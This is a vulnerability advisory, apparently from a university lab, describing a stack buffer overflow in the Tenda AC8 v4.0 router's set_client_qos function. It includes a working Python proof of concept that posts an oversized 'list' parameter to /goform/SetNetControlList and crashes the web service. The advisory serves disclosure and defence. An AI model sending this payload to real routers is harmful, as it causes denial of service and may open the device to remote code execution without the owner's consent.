# Tenda Router Vulnerability on set_client_qos function
> vendor:Tenda
>
> product:AC8
>
> version:v4.0 V16.03.34.06
>
> type:Stack Overflow  

# Overview 
- Firmware download website: https://www.tenda.com.cn/download/detail-3518.html

## Vulnerability Details

The Tenda AC8V4.0 V16.03.34.06 has a buffer overflow vulnerability. The vulnerability is triggered in the `formSetQosBand` function when it retrieves the value of the list parameter at line 30, and ultimately causes an overflow at line 50 in the `set_client_qos` function during the sscanf call. As a result, by requesting the page, an attacker can easily execute a **denial of service** attack or **remote code execution**.
![scqv_websgetvar](images/scqv_websgetvar.png)
![scqv_set_clinet_qos](images/scqv_set_clinet_qos.png)
![scqv_sscanf.png](images/scqv_sscanf.png)

## Recurring vulnerabilities and POC

Run this poc and you will see the service crash. The service will keep loading until it crashes.

```python
import requests
url = "http://192.168.1.100:80/goform/SetNetControlList"
bindnum_value = "aaaaa"
list_value = "a" + "\x12" * 500 + "z" * 500  

data = {
    "bindnum": bindnum_value,
    "list": list_value
}

response = requests.post(url, data=data)
```

![python-poc-crash](images/python_crash_scqv.png)

![httpd-segmentfault](images/httpd_crash_scqv.png)


# Discoverer
The vulnerability was discovered by Professor Wei Zhou's team (IoTS&P Lab) from the School of Cyber Science and Engineering at Huazhong University of Science and Technology.